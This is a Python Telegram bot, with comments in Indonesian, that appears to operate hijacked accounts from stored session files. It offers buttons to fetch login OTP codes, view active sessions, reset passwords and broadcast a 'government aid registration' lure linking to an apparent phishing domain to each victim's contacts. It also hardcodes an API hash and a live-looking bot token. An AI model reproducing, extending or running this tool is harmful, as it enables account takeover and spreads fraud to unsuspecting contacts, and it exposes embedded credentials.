import os
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from get_otp import get_otp_handler
from sesi_aktif import sesi_aktif_handler
from reset_password import reset_password_handler
from data_kontak import data_kontak_handler
from broadcast_to_contacts_handler import broadcast_to_contacts_handler
from telethon.sync import TelegramClient
from telethon.tl.types import User
from datetime import datetime
import pytz

# Konfigurasi bot
API_ID = 23416622
API_HASH = 'd1bc12a03ea26416b38b4616a36112b0'
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'

SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), 'ew_sessions'))
os.makedirs(SESSION_FOLDER, exist_ok=True)

# Ambil session login yang tersedia
def get_registered_sessions():
    return sorted([f.replace('.session', '') for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')])

# Menampilkan daftar session
async def send_session_list(update: Update, context: ContextTypes.DEFAULT_TYPE, page: int = 0):
    sessions = get_registered_sessions()
    per_page = 10
    start, end = page * per_page, (page + 1) * per_page
    current_page = sessions[start:end]

    keyboard = [[InlineKeyboardButton(num, callback_data=f"select_{num}")] for num in current_page]

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Back", callback_data=f"page_{page - 1}"))
    if end < len(sessions):
        nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"page_{page + 1}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text("📱 Pilih nomor:", reply_markup=reply_markup)
    else:
        await update.message.reply_text("📱 Pilih nomor:", reply_markup=reply_markup)

# Perintah /user
async def user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_session_list(update, context, 0)

# Tampilkan detail akun & tombol aksi
async def handle_select_number(update, context, phone_number):
    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")
    if not os.path.exists(session_path):
        await update.callback_query.message.reply_text(f"❌ Session tidak ditemukan untuk {phone_number}")
        return

    try:
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.start()
        me = await client.get_me()
        await client.disconnect()

        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or 'Tidak ada nama lengkap'
        username = me.username or 'Tidak ada username'
        bio = me.phone or 'Tidak ada bio'
        location = me.lang_code.upper() if me.lang_code else 'Tidak diketahui'
        local_time = datetime.now(pytz.timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M:%S')

        info = f"👤 *Info Akun*\n\n"
        info += f"🔹 *Nama*: {full_name}\n"
        info += f"🔹 *Username*: @{username}\n"
        info += f"🔹 *Bio*: {bio}\n"
        info += f"🔹 *Lokasi*: {location}\n"
        info += f"🕒 *Waktu*: {local_time} WIB\n\n"
        info += f"📱 Nomor: `{phone_number}`\n\nPilih aksi di bawah:"

    except Exception as e:
        await update.callback_query.message.reply_text(f"⚠️ Gagal ambil info `{phone_number}`:\n`{e}`", parse_mode='Markdown')
        return

    keyboard = [
        [
            InlineKeyboardButton("🔐 GET OTP", callback_data=f"getotp_{phone_number}"),
            InlineKeyboardButton("🟢 SESI AKTIF", callback_data=f"sesi_{phone_number}")
        ],
        [
            InlineKeyboardButton("🔁 RESET PASSWORD", callback_data=f"reset_{phone_number}"),
            InlineKeyboardButton("📇 BROADCAST", callback_data=f"kontak_{phone_number}")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.message.reply_text(info, parse_mode='Markdown', reply_markup=reply_markup)

# Fungsi tombol utama
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("page_"):
        page = int(data.split("_")[1])
        await send_session_list(update, context, page)

    elif data.startswith("select_"):
        phone_number = data.split("_", 1)[1]
        await handle_select_number(update, context, phone_number)

    elif data.startswith("getotp_"):
        phone_number = data.split("_", 1)[1]
        await get_otp_handler(update, context, phone_number)

    elif data.startswith("sesi_"):
        phone_number = data.split("_", 1)[1]
        await sesi_aktif_handler(update, context, phone_number)

    elif data.startswith("reset_"):
        phone_number = data.split("_", 1)[1]
        await reset_password_handler(update, context, phone_number)

    elif data.startswith("kontak_"):
        phone_number = data.split("_", 1)[1]
        message_to_broadcast = """
📣 *Info Penting untuk Anda!*

Segera daftar bantuan rakyat sekarang:
➡️ https://daftar.update-share2025.my.id/
"""
        await broadcast_to_contacts_handler(update, context, phone_number, message_to_broadcast)

    elif data == "stop_broadcast":
        await query.edit_message_text("❌ Broadcast dihentikan.")

    else:
        await query.edit_message_text(f"📦 Tidak dikenali: `{data}`", parse_mode='Markdown')

# Jalankan aplikasi bot
if __name__ == '__main__':
    app = Application.builder().token(BOT_TOKEN).build()
    app.bot_data['api_id'] = API_ID
    app.bot_data['api_hash'] = API_HASH

    app.add_handler(CommandHandler("user", user_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🤖 Bot aktif. Gunakan /user untuk memulai.")
    app.run_polling()
